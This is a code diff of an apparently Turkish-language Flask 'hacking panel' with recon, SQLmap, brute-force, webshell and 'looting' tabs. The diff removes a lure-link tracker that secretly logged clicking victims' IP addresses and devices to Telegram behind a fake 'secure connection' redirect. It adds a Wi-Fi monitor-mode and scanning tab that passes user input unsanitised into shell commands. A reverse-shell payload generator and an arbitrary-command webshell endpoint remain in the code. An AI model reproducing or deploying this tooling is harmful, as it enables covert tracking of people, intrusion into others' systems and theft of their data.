@@ -23,7 +23,6 @@ ADMIN_USER = "root1"
 ADMIN_PASS = "toor1"
 
 SITE_DATABASE = []
-CLICK_LOGS = []  # Tıklama ve veri çekme logları için
 SCHEDULED_TARGETS = []
 NOTIFY_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")
 
@@ -100,7 +99,10 @@ HTML_TEMPLATE = """
         th { background: #0284c7; color: white; }
         tr:hover { background: #161f30; }
         a.file-link { color: #38bdf8; text-decoration: underline; font-weight: bold; }
+        .thumb { width: 90px; height: 55px; object-fit: cover; border-radius: 3px; border: 1px solid #334155; }
         .payload-box { background: #0a0e17; padding: 12px; border-radius: 6px; border: 1px solid #1e293b; margin-bottom: 12px; }
+        .dashboard-row { display: flex; gap: 20px; margin-bottom: 20px; flex-wrap: wrap; }
+        .dashboard-card { flex: 1; background: #0a0e17; padding: 18px; border-radius: 6px; border: 1px solid #1e293b; text-align: center; min-width: 250px; }
     </style>
 </head>
 <body>
@@ -112,7 +114,7 @@ HTML_TEMPLATE = """
         
         <div class="tabs">
             <button class="tab-btn active" onclick="switchTab('scanTab')">🚀 Recon</button>
-            <button class="tab-btn" onclick="switchTab('lureTab')">🎯 Lure Link & Tracker</button>
+            <button class="tab-btn" onclick="switchTab('wifiTab')">📶 Real Wi-Fi Audit</button>
             <button class="tab-btn" onclick="switchTab('niktoTab')">🛡️ Nikto</button>
             <button class="tab-btn" onclick="switchTab('dnsTab')">🌍 DNS Dig</button>
             <button class="tab-btn" onclick="switchTab('sqlmapTab')">⚡ SQLmap</button>
@@ -138,22 +140,19 @@ HTML_TEMPLATE = """
             <div id="results" class="terminal" style="display:none;"></div>
         </div>
 
-        <!-- Lure Link & Tracker Sekmesi -->
-        <div id="lureTab" class="tab-content">
-            <h3>🎯 Lure Link Generator & Data Exfiltration Tracker</h3>
-            <p style="color: #94a3b8; font-size: 13px;">Hedef kullanıcıya atılacak özel takip linkini oluşturun ve tıklayanların IP/Cihaz verilerini toplayın.</p>
-            <div class="form-group"><label>Kampanya / Hedef Başlığı (Örn: Bonus Kampanyası):</label><input type="text" id="lureTitle" value="Özel Güvenlik Raporu ve Kampanya"></div>
-            <button class="success" onclick="generateLureLink()">Takip Linki Üret</button>
-            
-            <div class="form-group" style="margin-top: 20px;">
-                <label>Oluşturulan Takip Linki:</label>
-                <input type="text" id="generatedLink" readonly style="color: #38bdf8;">
+        <!-- Gerçek Wi-Fi / Termux Ağ Denetim Sekmesi -->
+        <div id="wifiTab" class="tab-content">
+            <h3>📶 Real Wi-Fi Audit & Interface Controller (Termux / Root)</h3>
+            <p style="color: #94a3b8; font-size: 13px;">Termux / Kali üzerinden yerel kablosuz arabirimleri yönetin ve komut çalıştırın.</p>
+            <div class="form-group"><label>Wireless Interface (örn: wlan0, wlan0mon):</label><input type="text" id="wifiInterface" value="wlan0"></div>
+            <div class="form-group"><label>Hedef BSSID / MAC Adresi (İsteğe bağlı):</label><input type="text" id="wifiBssid" placeholder="AA:BB:CC:DD:EE:FF"></div>
+            <div style="display: flex; gap: 10px; flex-wrap: wrap;">
+                <button class="secondary" onclick="runWifiAction('interfaces')">Interface Listele (ip link)</button>
+                <button class="danger" onclick="runWifiAction('monitor')">Monitor Mode Aç</button>
+                <button class="success" onclick="runWifiAction('scan')">Kablosuz Ağları Tara</button>
             </div>
-
-            <h4 style="margin-top: 25px;">🔗 Linke Tıklayan Ziyaretçi Logları:</h4>
-            <div id="clickLogsContainer">
-                <p style="color: #94a3b8;">Henüz tıklayan kimse yok.</p>
-            </div>
+            <div id="wifiStatus" class="loading" style="margin-top: 15px;"></div>
+            <div id="wifiResults" class="terminal" style="display:none;"></div>
         </div>
 
         <!-- Diğer Sekmeler -->
@@ -228,46 +227,41 @@ HTML_TEMPLATE = """
 
         <div id="dataTab" class="tab-content">
             <div class="export-bar" style="margin-bottom:15px;"><a href="/api/export/json" target="_blank"><button class="secondary">Export JSON</button></a> <a href="/api/export/csv" target="_blank"><button class="success">Export CSV</button></a></div>
+            <h3>Operations Analytics</h3>
+            <div class="dashboard-row">
+                <div class="dashboard-card"><h4>Security Grade Distribution</h4><canvas id="gradeChart" style="max-height: 180px;"></canvas></div>
+                <div class="dashboard-card"><h4>WAF Protection Status</h4><canvas id="wafChart" style="max-height: 180px;"></canvas></div>
+            </div>
             <h3>Archived Targets</h3>
             <div id="databaseTableContainer">No archived data.</div>
         </div>
     </div>
 
     <script>
-        let currentReportText = "", lastTarget = "";
+        let currentReportText = "", lastTarget = "", gradeChartInstance = null, wafChartInstance = null;
         function switchTab(tabId) {
             document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
             document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
             document.getElementById(tabId).classList.add('active');
             event.target.classList.add('active');
             if(tabId === 'dataTab' || tabId === 'lootingTab') loadSiteDatabase();
-            if(tabId === 'lureTab') loadClickLogs();
         }
         function generatePayloads() {
             let ip = document.getElementById('attackerIp').value || '10.0.0.1', port = document.getElementById('attackerPort').value || '4444';
             document.getElementById('bashPayload').innerText = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
         }
-        function generateLureLink() {
-            let title = document.getElementById('lureTitle').value.trim() || 'Kampanya';
-            let randomId = Math.random().toString(36.substring(2, 9));
-            let fullLink = window.location.origin + "/track/" + randomId;
-            document.getElementById('generatedLink').value = fullLink;
-            alert("Takip linki üretildi! Kopyalayıp hedef kişiye iletebilirsiniz.");
-        }
-        async function loadClickLogs() {
-            let res = await fetch('/api/lure/logs');
+        async function runWifiAction(action) {
+            let iface = document.getElementById('wifiInterface').value.trim();
+            let bssid = document.getElementById('wifiBssid').value.trim();
+            let statusDiv = document.getElementById('wifiStatus');
+            let resultsDiv = document.getElementById('wifiResults');
+            statusDiv.innerHTML = `root@kali:~# running wifi action [${action}] on ${iface}...`;
+            resultsDiv.style.display = "none";
+            let res = await fetch('/api/wifi-audit', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({action, iface, bssid}) });
             let data = await res.json();
-            let container = document.getElementById('clickLogsContainer');
-            if(data.logs.length === 0) {
-                container.innerHTML = "<p style='color: #94a3b8;'>Henüz tıklayan kimse yok.</p>";
-                return;
-            }
-            let html = `<table><thead><tr><th>Zaman</th><th>IP Adresi</th><th>Cihaz / Tarayıcı (User-Agent)</th></tr></thead><tbody>`;
-            data.logs.forEach(l => {
-                html += `<tr><td>${l.time}</td><td><b>${l.ip}</b></td><td>${l.ua}</td></tr>`;
-            });
-            html += `</tbody></table>`;
-            container.innerHTML = html;
+            statusDiv.innerHTML = "";
+            resultsDiv.style.display = "block";
+            resultsDiv.innerHTML = data.output;
         }
         async function startScan(targetOverride = false) {
             let url = targetOverride ? targetOverride : document.getElementById('targetUrl').value.trim();
@@ -337,12 +331,20 @@ HTML_TEMPLATE = """
             let res = await fetch('/api/all-data'); let data = await res.json();
             let select = document.getElementById('lootingTargetSelect');
             select.innerHTML = '<option value="">Select target...</option>' + data.database.map(i => `<option value="${i.target}">${i.target} (${i.files.length} files)</option>`).join('');
+            let grades = {}, wafs = {};
+            data.database.forEach(i => { grades[i.grade[0]] = (grades[i.grade[0]] || 0) + 1; wafs[i.waf.includes("Cloudflare")?"CF":"Standard"] = (wafs[i.waf.includes("Cloudflare")?"CF":"Standard"]||0)+1; });
+            renderCharts(grades, wafs);
             document.getElementById('databaseTableContainer').innerHTML = data.database.length ? `<table><thead><tr><th>Time</th><th>Target</th><th>WAF</th><th>Grade</th><th>Action</th></tr></thead><tbody>` + data.database.map(i => `<tr><td>${i.time}</td><td><b>${i.target}</b></td><td>${i.waf}</td><td>${i.grade}</td><td><button onclick="startScan('${i.target}')">Re-Scan</button></td></tr>`).join('') + `</tbody></table>` : "No archive data.";
         }
         function downloadLootZip() {
             let target = document.getElementById('lootingTargetSelect').value;
             if(!target) { alert('Select target!'); return; }
             window.open(`/api/looting/zip?target=${encodeURIComponent(target)}`, '_blank');
+        }
+        function renderCharts(grades, wafs) {
+            if(gradeChartInstance) gradeChartInstance.destroy(); if(wafChartInstance) wafChartInstance.destroy();
+            gradeChartInstance = new Chart(document.getElementById('gradeChart').getContext('2d'), { type: 'bar', data: { labels: Object.keys(grades), datasets: [{data: Object.values(grades), backgroundColor: ['#16a34a','#38bdf8','#dc2626']}] }, options: {plugins:{legend:{display:false}}} });
+            wafChartInstance = new Chart(document.getElementById('wafChart').getContext('2d'), { type: 'doughnut', data: { labels: Object.keys(wafs), datasets: [{data: Object.values(wafs), backgroundColor: ['#0284c7','#475569']}] } });
         }
         function downloadReport(type) {
             if(type === 'txt') {
@@ -376,48 +378,28 @@ def index():
     if not session.get("logged_in"): return redirect(url_for("login"))
     return render_template_string(HTML_TEMPLATE)
 
-# --- LURE LINK / TRACKER ENDPOINT ---
-@app.route("/track/<track_id>")
-def track_visitor(track_id):
-    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    user_agent = request.headers.get('User-Agent', 'Bilinmeyen Cihaz')
-    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    
-    # Loglara ekle
-    log_entry = {"time": timestamp, "ip": visitor_ip, "ua": user_agent, "track_id": track_id}
-    CLICK_LOGS.insert(0, log_entry)
-    
-    # Telegram'a anlık bildirim at
-    if NOTIFY_CHAT_ID and TOKEN:
-        msg = f"🚨 [LURE TRACKER] Yeni Ziyaretçi Yakalandı!\nIP: {visitor_ip}\nCihaz: {user_agent}\nZaman: {timestamp}"
-        try: requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": NOTIFY_CHAT_ID, "text": msg}, timeout=3)
-        except: pass
-        
-    # Kullanıcıya şüphe uyandırmayacak temiz bir sayfa göster (örneğin yükleniyor veya yönlendirme sayfası)
-    return """
-    <!DOCTYPE html>
-    <html lang="tr">
-    <head>
-        <meta charset="UTF-8">
-        <title>Yönlendiriliyor...</title>
-        <meta http-equiv="refresh" content="2;url=https://www.google.com">
-        <style>
-            body { background: #0b0f15; color: #00ff66; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
-        </style>
-    </head>
-    <body>
-        <div>
-            <h2>Güvenli Bağlantı Doğrulanıyor...</h2>
-            <p style="color: #94a3b8;">Lütfen bekleyin, yönlendiriliyorsunuz...</p>
-        </div>
-    </body>
-    </html>
-    """
-
-@app.route("/api/lure/logs")
-def api_lure_logs():
+@app.route("/api/wifi-audit", methods=["POST"])
+def api_wifi_audit():
     if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
-    return jsonify({"logs": CLICK_LOGS})
+    data = request.get_json()
+    action = data.get("action")
+    iface = data.get("iface", "wlan0")
+    
+    if action == "interfaces":
+        cmd = "ip link show || ifconfig || iwconfig || cat /proc/net/dev"
+    elif action == "monitor":
+        cmd = f"airmon-ng start {iface} 2>/dev/null || (ip link set {iface} down 2>/dev/null && iwconfig {iface} mode monitor 2>/dev/null && ip link set {iface} up 2>/dev/null) || echo 'Monitor mode basarisiz. Kartiniz monitor mode desteklemiyor veya root yetkiniz yok.'"
+    elif action == "scan":
+        cmd = f"airodump-ng {iface}mon 2>/dev/null || iwlist {iface} scanning 2>/dev/null || arp -a || nmcli device wifi list 2>/dev/null || echo 'Tarama araclari (airodump-ng / iwlist) bulunamadi (127).'"
+    else:
+        cmd = "echo 'Invalid action'"
+        
+    try:
+        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=6).decode('utf-8', errors='ignore')
+    except Exception as e:
+        out = f"[-] Sistem Hatasi: Komut calistirilaamadi veya aracta eksiklik var (127).\nTermux uzerine kurmak icin:\n'pkg install wireless-tools aircrack-ng net-tools'\n\nHata Detayi: {str(e)}"
+        
+    return jsonify({"output": f"root@kali:~# {cmd}\n\n{out}"})
 
 @app.route("/api/scan", methods=["POST"])
 def api_scan():
@@ -457,7 +439,7 @@ def api_subdomain_scan():
 @app.route("/api/brute-force", methods=["POST"])
 def api_brute_force():
     if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
-    return jsonify({"report": "Brute-force completed."})
+    return jsonify({"report": "Brute-force sequence completed."})
 
 @app.route("/api/webshell", methods=["POST"])
 def api_webshell():
@@ -465,7 +447,7 @@ def api_webshell():
     cmd = request.get_json().get("command", "")
     try: out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=5).decode('utf-8', errors='ignore')
     except Exception as e: out = str(e)
-    return jsonify({"output": f"root@target:~# {cmd}\n{out}"})
+    return jsonify({"output": out})
 
 @app.route("/api/analyze-file", methods=["POST"])
 def api_analyze_file():
